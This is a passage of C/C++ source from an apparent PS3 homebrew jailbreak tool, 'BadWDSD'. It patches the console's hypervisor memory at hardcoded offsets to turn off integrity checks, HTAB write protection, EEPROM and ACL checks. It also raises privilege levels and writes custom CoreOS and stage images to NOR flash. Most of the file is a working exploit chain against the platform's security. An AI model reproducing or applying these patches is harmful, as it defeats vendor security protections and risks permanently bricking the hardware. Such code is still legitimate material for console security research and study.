            //}
        }

        eieio();
        uint64_t t2 = GetTimeInUs();
        Glitcher_Stop();

#else

		Glitcher_Start();
		uint64_t t1 = GetTimeInUs();

		lv2_glitcher_test((uint64_t)mem, size, &writeCount);

		uint64_t t2 = GetTimeInUs();
		Glitcher_Stop();

#endif

		PrintLog("writeCount = %lu, delta = %luus\n", writeCount, (t2 - t1));

		PrintLog("Checking memory...\n");

		ClearDataCache();

		for (uint64_t i = 0; i < size; i++)
		{
			uint64_t addr = (uint64_t)&mem[i];

			uint8_t v = mem[i];

			// uint8_t expected_v = (i < writeCount) ? (255 - (addr % 255)) : (addr % 255);
			uint8_t expected_v = 0x69;

			if (v != expected_v)
			{
				PrintLog("Corruption found!, addr = 0x%lx, offset = %lu, v = 0x%x, expected_v = 0x%x\n", addr, i, (uint32_t)v, (uint32_t)expected_v);

				success = true;
			}
		}

		if (success)
		{
			WaitInMs(2000);

			lv2_beep_triple();
			break;
		}

		loopCount++;

		WaitInMs(500);
	}

	free(mem);

	Glitcher_Destroy();
}

void PatchHvcall114()
{
	PrintLog("PatchHvcall114()\n");

	{
		// < 2F 80 00 00 41 9E 00 28 38 60 00 00 38 80 00 00
		// ---
		// > 60 00 00 00 48 00 00 28 38 60 00 00 38 80 00 00

		uint64_t offset;

		if (fwVersion >= 4.70)
			offset = 0x2DCF54;
		else
		{
			PrintLog("firmware not supported!!!\n");

			abort();
			return;
		}

		PrintLog("offset = 0x%lx\n", offset);

		uint64_t newval = 0x6000000048000028;
		lv1_write(offset, 8, &newval);
	}

	{
		// < 00 4B FF FB FD 7C 60 1B
		// ---
		// > 01 4B FF FB FD 7C 60 1B

		uint64_t offset;

		if (fwVersion >= 4.70)
			offset = 0x2DD287;
		else
		{
			PrintLog("firmware not supported!!!\n");

			abort();
			return;
		}

		PrintLog("offset = 0x%lx\n", offset);

		uint64_t newval = 0x014BFFFBFD7C601B;
		lv1_write(offset, 8, &newval);
	}

	if (!IsExploited())
	{
		PrintLog("Patch failed!\n");

		abort();
		return;
	}

	PrintLog("PatchHvcall114() done\n");
}

void PatchMoreLv1()
{
	PrintLog("PatchMoreLv1()\n");

	WaitInMs(1000);
	lv2_beep_single();

	if (fwVersion < 4.70)
	{
		PrintLog("firmware not supported!\n");

		abort();
		return;
	}

	{
		PrintLog("Patching lv1 182/183\n");

		uint64_t patches[4];

		patches[0] = 0xE8830018E8840000ULL;
		patches[1] = 0xF88300C84E800020ULL;
		patches[2] = 0x38000000E8A30020ULL;
		patches[3] = 0xE8830018F8A40000ULL;

		lv1_write(0x309E4C, 32, patches);
	}

	{
		PrintLog("Patching Shutdown on LV2 modification\n");

		uint64_t old;
		lv1_read(0x2b4434, 8, &old);
		old &= 0x00000000FFFFFFFFULL;

		uint64_t newval = 0x6000000000000000ULL | old;
		lv1_write(0x2b4434, 8, &newval);
	}

	// HTAB

	{
		PrintLog("Patching HTAB write protection\n");

		uint64_t old;
		lv1_read(0x0AC594, 8, &old);
		old &= 0x00000000FFFFFFFFULL;

		uint64_t newval = 0x3860000000000000ULL | old;
		lv1_write(0x0AC594, 8, &newval);
	}

	{
		PrintLog("Patching Update Manager EEPROM write access\n");

		uint64_t old;
		lv1_read(0x0FEBD4, 8, &old);
		old &= 0x00000000FFFFFFFFULL;

		uint64_t newval = 0x3800000000000000ULL | old;
		lv1_write(0x0FEBD4, 8, &newval);
	}

	// Repo nodes

	{
		PrintLog("Patching Repo nodes modify\n");

		// poke_lv1(0x2E4E28 +  0, 0xE81E0020E95E0028ULL);
		// poke_lv1(0x2E4E28 +  8, 0xE91E0030E8FE0038ULL);
		// poke_lv1(0x2E4E28 + 12, 0xE8FE0038EBFE0018ULL);

		{
			uint32_t patches[5];

			patches[0] = 0xE81E0020;
			patches[1] = 0xE95E0028;

			patches[2] = 0xE91E0030;
			patches[3] = 0xE8FE0038;

			patches[4] = 0xEBFE0018;

			lv1_write(0x2E4E28, 20, patches);
		}

		// poke_lv1(0x2E50AC +  0, 0xE81E0020E93E0028ULL);
		// poke_lv1(0x2E50AC +  8, 0xE95E0030E91E0038ULL);
		// poke_lv1(0x2E50AC + 16, 0xE8FE0040E8DE0048ULL);
		// poke_lv1(0x2E50AC + 20, 0xE8DE0048EBFE0018ULL);

		{
			uint32_t patches[7];

			patches[0] = 0xE81E0020;
			patches[1] = 0xE93E0028;

			patches[2] = 0xE95E0030;
			patches[3] = 0xE91E0038;

			patches[4] = 0xE8FE0040;
			patches[5] = 0xE8DE0048;

			patches[6] = 0xEBFE0018;

			lv1_write(0x2E50AC, 28, patches);
		}

		// poke_lv1(0x2E5550 +  0, 0xE81E0020E93E0028ULL);
		// poke_lv1(0x2E5550 +  8, 0xE95E0030E91E0038ULL);
		// poke_lv1(0x2E5550 + 16, 0xE8FE0040E8DE0048ULL);
		// poke_lv1(0x2E5550 + 20, 0xE8DE0048EBFE0018ULL);

		{
			uint32_t patches[7];

			patches[0] = 0xE81E0020;
			patches[1] = 0xE93E0028;

			patches[2] = 0xE95E0030;
			patches[3] = 0xE91E0038;

			patches[4] = 0xE8FE0040;
			patches[5] = 0xE8DE0048;

			patches[6] = 0xEBFE0018;

			lv1_write(0x2E5550, 28, patches);
		}
	}

	{
		PrintLog("Patching lv1_set_dabr\n");

		uint64_t old;
		lv1_read(0x2EB550, 8, &old);
		old &= 0x00000000FFFFFFFFULL;

		uint64_t newval = 0x3800000F00000000ULL | old;
		lv1_write(0x2EB550, 8, &newval);
	}

	{
		PrintLog("Patching Dispatch Manager\n");

		{
			uint64_t old;
			lv1_read(0x16FA64, 8, &old);
			old &= 0x00000000FFFFFFFFULL;

			uint64_t newval = 0x6000000000000000ULL | old;
			lv1_write(0x16FA64, 8, &newval);
		}

		{
			uint64_t old;
			lv1_read(0x16FA88, 8, &old);
			old &= 0x00000000FFFFFFFFULL;

			uint64_t newval = 0x3860000100000000ULL | old;
			lv1_write(0x16FA88, 8, &newval);
		}

		{
			uint64_t old;
			lv1_read(0x16FB00, 8, &old);
			old &= 0x00000000FFFFFFFFULL;

			uint64_t newval = 0x3BE0000100000000ULL | old;
			lv1_write(0x16FB00, 8, &newval);
		}

		{
			uint64_t old;
			lv1_read(0x16FB08, 8, &old);
			old &= 0x00000000FFFFFFFFULL;

			uint64_t newval = 0x3860000000000000ULL | old;
			lv1_write(0x16FB08, 8, &newval);
		}
	}

	{
		PrintLog("Patching MFC_SR1\n");

		uint64_t old;
		lv1_read(0x2F9EB8, 8, &old);
		old &= 0x00000000FFFFFFFFULL;

		uint64_t newval = 0x3920FFFF00000000ULL | old;
		lv1_write(0x2F9EB8, 8, &newval);
	}

	{
		PrintLog("Patching ACL\n");

		uint64_t patches[2];

		patches[0] = 0x386000012F830000ULL;
		patches[1] = 0x419E001438000001ULL;

		lv1_write(0x25C504, 16, patches);
	}

	{
		PrintLog("Modifying laid to HV level...\n");

		int32_t res = lv1_modify_repository_node_value(
			1, // PS3_LPAR_ID_PME
			lv1_repository_string("ss") >> 32,
			lv1_repository_string("laid"),
			2,
			0,
			0x1070000001000001, /* SCE_CELLOS_PME */
			0);

		if (res != 0)
		{
			PrintLog("lv1_modify_repository_node_value failed!, res = %d\n", res);

			abort();
			return;
		}
	}

	WaitInMs(1000);
	lv2_beep_single();

	PrintLog("PatchMoreLv1() done!\n");
}

void apply_rsx_clock(uint64_t core, uint64_t mem)
{
	union clock_s
	{
	public:
		struct
		{
		public:
			uint32_t junk0;
			uint8_t junk1;
			uint8_t junk2;
			uint8_t mul;
			uint8_t junk3;
		};

		uint64_t value;
	};

	// apply core

	clock_s clock;
	clock.value = lv1_peek(0x28000004028);

	clock.mul = (core / 50);

	lv1_poke(0x28000004028, clock.value);
	eieio();

	WaitInMs(500);

	// apply mem

	{
		uint8_t target_mul = (mem / 25);

		clock_s clock;
		clock.value = lv1_peek(0x28000004010);

		bool up = (target_mul > clock.mul);

		while (clock.mul != target_mul)
		{
			// must apply slowly in 25mhz step, wait, repeat until reach target

			clock.mul += up ? 1 : -1;

			lv1_poke(0x28000004010, clock.value);
			eieio();

			WaitInMs(200);

			// PrintLog("%lx\n", (uint64_t)clock.mul);
		}
	}
}

void BadWDSD_Write_Stagex()
{
	PrintLog("BadWDSD_Write_Stagex()\n");

	if (!FlashIsNor())
	{
		PrintLog("Flash is not nor!!!\n");

		abort();
		return;
	}

	FILE *f = NULL;

	if (f == NULL)
	{
		PrintLog("Loading /app_home/Stagex.bin\n");

		f = fopen("/app_home/Stagex.bin", "rb");

		if (f == NULL)
			PrintLog("Not found\n");
	}

	if (f == NULL)
	{
		PrintLog("Loading /dev_hdd0/Stagex.bin\n");

		f = fopen("/dev_hdd0/Stagex.bin", "rb");

		if (f == NULL)
			PrintLog("Not found\n");
	}

	if (f == NULL)
	{
		PrintLog("Stagex.bin not found!\n");

		abort();
		return;
	}

	size_t size = GetFileSize(f);
	PrintLog("size = %lu\n", size);

	void *code = malloc(size);
	fread(code, 1, size, f);

	fclose(f);

	PrintLog("code = 0x%lx\n", (uint64_t)code);

	if (size > (48 * 1024))
	{
		PrintLog("size is too big!!!\n");

		abort();
		return;
	}

	PrintLog("Writing to flash...\n");
	// lv1_write(0x2401F031000, size, code);
	NorWrite(0x31000, code, size);

	{
		PrintLog("0x%lx\n", lv1_peek(0x2401F000200));
		PrintLog("0x%lx\n", lv1_peek(0x2401F031000));
	}

	free(code);
	PrintLog("BadWDSD_Write_Stagex() done,\n");
}

void BadWDSD_Write_ros(bool compare, bool doFlashRos1)
{
	PrintLog("BadWDSD_Write_ros()\n");

	if (!FlashIsNor())
	{
		PrintLog("Flash is not nor!!!\n");

		abort();
		return;
	}

	FILE *f = NULL;

	if (f == NULL)
	{
		PrintLog("Loading /app_home/CoreOS.bin\n");

		f = fopen("/app_home/CoreOS.bin", "rb");

		if (f == NULL)
			PrintLog("Not found\n");
	}

	if (f == NULL)
	{
		PrintLog("Loading /dev_hdd0/CoreOS.bin\n");

		f = fopen("/dev_hdd0/CoreOS.bin", "rb");

		if (f == NULL)
			PrintLog("Not found\n");
	}

	if (f == NULL)
	{
		PrintLog("CoreOS.bin not found!\n");

		abort();
		return;
	}

	size_t size = GetFileSize(f);
	PrintLog("size = %lu\n", size);

	void *code = malloc(size);
	fread(code, 1, size, f);

	fclose(f);

	PrintLog("code = 0x%lx\n", (uint64_t)code);

	if (size > 0x700000)
	{
		PrintLog("size is too big!!!\n");

		abort();
		return;
	}

	if (compare)
	{
		PrintLog("Comparing ros...\n");

		void *ros0 = malloc(0x700000);
		void *ros1 = malloc(0x700000);

		if (ros0 == NULL || ros1 == NULL)
		{
			PrintLog("malloc fail!\n");

			abort();

			return;
		}

		NorRead(0x0C0000, ros0, 0x700000);
		NorRead(0x7C0000, ros1, 0x700000);

		if (memcmp(ros0, ros1, 0x700000))
		{
			PrintLog("ros compare fail!, please reinstall same firmware twice!\n");

			abort();
			return;
		}

		free(ros1);
		free(ros0);
	}

	PrintLog("Writing to flash (%s)...\n", doFlashRos1 ? "ros1" : "ros0");
	NorWrite(doFlashRos1 ? 0x7C0000 : 0x0C0000, code, size);

	{
		PrintLog("0x%lx\n", lv1_peek(0x2401F000200));
		PrintLog("0x%lx\n", lv1_peek(0x2401F031000));
	}

	free(code);
	PrintLog("BadWDSD_Write_ros() done.\n");
}

void Sputest()
{
	PrintLog("Sputest()\n");

	InstallOurHvcall();

	{
		uint64_t spu_id = 5;

		{
			//ls = 0x0
			//status = 0x2
			//Mbox = 0x1
			//runcntl = 0x2
			//privcntl = 0x0

			uint32_t ls = SPU_LS_Read32(spu_id, 0);
			PrintLog("ls = 0x%x\n", ls);

			uint32_t status = SPU_PS_Read32(spu_id, 0x04024);
			PrintLog("status = 0x%x\n", status);

			uint32_t mbox = SPU_PS_Read32(spu_id, 0x04004);
			PrintLog("Mbox = 0x%x\n", mbox);

			uint32_t runcntl = SPU_PS_Read32(spu_id, 0x0401C);
			PrintLog("runcntl = 0x%x\n", runcntl);

			uint64_t privcntl = SPU_P2_Read64(spu_id, 0x04040);
			PrintLog("privcntl = 0x%lx\n", privcntl);
		}

		// 0x41099B8260DD5682 0x21A00E0232000000
		SPU_LS_Write64(spu_id, 0, 0x41099B8260DD5682);
		SPU_LS_Write64(spu_id, 8, 0x21A00E0232000000);

		PrintLog("1\n");

		// SPU_PRIVCNTL = 0x00
		SPU_P2_Write64(spu_id, 0x04040, 0x0);

		PrintLog("2\n");

		// SPU_NPC[0:29] = entry (LS)
		SPU_PS_Write32(spu_id, 0x04034, 0x0);

		PrintLog("3\n");

		eieio();

		// SPU_RUNCNTL = 0x1
		SPU_PS_Write32(spu_id, 0x0401C, 0x1);
		eieio();

		PrintLog("4\n");

		WaitInMs(1000);

		while (1)
		{
			//ls = 0x41099b82
			//status = 0x1
			//Mbox = 0x1337baad
			//runcntl = 0x1
			//privcntl = 0x0

			uint32_t ls = SPU_LS_Read32(spu_id, 0);
			PrintLog("ls = 0x%x\n", ls);

			uint32_t status = SPU_PS_Read32(spu_id, 0x04024);
			PrintLog("status = 0x%x\n", status);

			uint32_t mbox = SPU_PS_Read32(spu_id, 0x04004);
			PrintLog("Mbox = 0x%x\n", mbox);

			uint32_t runcntl = SPU_PS_Read32(spu_id, 0x0401C);
			PrintLog("runcntl = 0x%x\n", runcntl);

			uint64_t privcntl = SPU_P2_Read64(spu_id, 0x04040);
			PrintLog("privcntl = 0x%lx\n", privcntl);

			WaitInMs(1000);
		}
	}
}

int main(int argc, char *argv[])
{
	lv2_beep_triple();

	InitLogging();

	PrintLog("BadWDSD by Kafuu(aomsin2526)\n");
	PrintLog("Build date: %s %s\n", __DATE__, __TIME__);

	{
		FILE *fp;
		fp = fopen("/dev_flash/vsh/etc/version.txt", "rb");

		if (fp != NULL)
		{
			char bufs[1024];

			fgets(bufs, 1024, fp);
			fclose(fp);

			fwVersion = strtod(bufs + 8, NULL);
		}
	}

	PrintLog("fwVersion = %lf\n", fwVersion);

#if 0
	if (fwVersion < 4.70)
	{
		PrintLog("firmware not supported!\n");

		abort();
		return 0;
	}
#endif

	PrintLog("Flash is %s\n", FlashIsNor() ? "NOR" : "NAND");

	if (TargetIsCEX())
	{
		PrintLog("Target is CEX\n");
	}
	else if (TargetIsDEX())
	{
		PrintLog("Target is DEX\n");
	}
	else if (TargetIsDECR())
	{
		PrintLog("Target is DECR\n");
	}
	else
	{
		PrintLog("Unknown target!!!\n");
	}

	WaitInMs(500);

	{
#if 0

		bool doGlitcherTest = IsFileExist("/dev_hdd0/BadHTAB_doGlitcherTest.txt");

		bool doSkipStage1 = IsFileExist("/dev_hdd0/BadHTAB_doSkipStage1.txt");

		bool doStage1_CFW = IsFileExist("/dev_hdd0/BadHTAB_doStage1_CFW.txt");

		bool doSkipStage2 = IsFileExist("/dev_hdd0/BadHTAB_doSkipStage2.txt");

		bool doSkipPatchMoreLv1 = IsFileExist("/dev_hdd0/BadHTAB_doSkipPatchMoreLv1.txt");

		bool doDumpLv1 = IsFileExist("/dev_hdd0/BadHTAB_doDumpLv1.txt");
		bool doDumpLv1_240M = IsFileExist("/dev_hdd0/BadHTAB_doDumpLv1_240M.txt");

		bool doLoadLv2Kernel_Self = IsFileExist("/dev_hdd0/BadHTAB_doLoadLv2Kernel_Self.txt");
		bool doLoadLv2Kernel_Fself = IsFileExist("/dev_hdd0/BadHTAB_doLoadLv2Kernel_Fself.txt");

		bool doOtherOS = IsFileExist("/dev_hdd0/BadHTAB_doOtherOS.txt");

		if (doGlitcherTest)
		{
			GlitcherTest();
		}
		else
		{
			if (!doSkipStage1)
			{
				if (doStage1_CFW)
					Stage1_CFW();
				else
					Stage1_v2();
			}

			if (!doSkipStage2)
				Stage2_Hvcall();

			if (doSkipStage2)
			{
				if (!IsExploited())
				{
					PrintLog("Should exploited at this point!\n");

					abort();
					return 0;
				}

				InstallOurHvcall();
			}

			PrintLog("lv1_peek/poke now available.\n");

			if (!doSkipStage2)
				PatchHvcall114();

			if (!IsExploited())
			{
				PrintLog("Should exploited at this point!\n");

				abort();
				return 0;
			}

			PrintLog("lv1_peek/poke_114 now available.\n");

			if (!doSkipPatchMoreLv1)
				PatchMoreLv1();

			if (doDumpLv1)
				DumpLv1();

			if (doDumpLv1_240M)
				DumpLv1_240M();

			if (doLoadLv2Kernel_Self)
				LoadLv2Kernel("lv2_kernel.self", LoadLv2KernelType_e::Self);

			if (doLoadLv2Kernel_Fself)
				LoadLv2Kernel("lv2_kernel.fself", LoadLv2KernelType_e::Fself);

			if (doOtherOS)
				LoadLv2Kernel("dtbImage.ps3.fself", LoadLv2KernelType_e::OtherOS_Fself);

			//apply_rsx_clock(100, 450);

			PrintLog("timebase = %lu\n", sysGetTimebaseFrequency());

			//BadWDSD_Stage1_Bin_Test();
			//BadWDSD_Stage1_Bin_Flash_Test(true);
			//BadWDSD_Stage1_Bin_Flash_Test(false);

			//BadWDSD_Write_ros0();
		}
#endif

#if 1 

		bool doLoadLv2Kernel_Fself = IsFileExist("/dev_hdd0/BadWDSD_doLoadLv2Kernel_Fself.txt");
		bool doLoadLv2Kernel_ZFself = IsFileExist("/dev_hdd0/BadWDSD_doLoadLv2Kernel_ZFself.txt");

		bool doOtherOS_Fself = IsFileExist("/dev_hdd0/BadWDSD_doOtherOS_Fself.txt");
		bool doOtherOS_ZFself = IsFileExist("/dev_hdd0/BadWDSD_doOtherOS_ZFself.txt");

		if (doLoadLv2Kernel_Fself)
			LoadLv2Kernel("lv2_kernel.fself", LoadLv2KernelType_e::Fself);

		if (doLoadLv2Kernel_ZFself)
			LoadLv2Kernel("lv2_kernel.zfself", LoadLv2KernelType_e::Fself);

		if (doOtherOS_Fself)
			LoadLv2Kernel("dtbImage.ps3.fself", LoadLv2KernelType_e::OtherOS_Fself);

		if (doOtherOS_ZFself)
			LoadLv2Kernel("dtbImage.ps3.zfself", LoadLv2KernelType_e::OtherOS_Fself);

		bool doSkipRosCompare = IsFileExist("/dev_hdd0/BadWDSD_doSkipRosCompare.txt");
		bool doFlashRos1 = IsFileExist("/dev_hdd0/BadWDSD_doFlashRos1.txt");

		BadWDSD_Write_Stagex();
		BadWDSD_Write_ros(!doSkipRosCompare, doFlashRos1);

#endif

		//Sputest();
	}

	PrintLog("Bye!\n");

	DestroyLogging();

	Sleep(5);
	lv2_beep_long();
	Sleep(5);
	lv2_beep_triple();

	return 0;
}
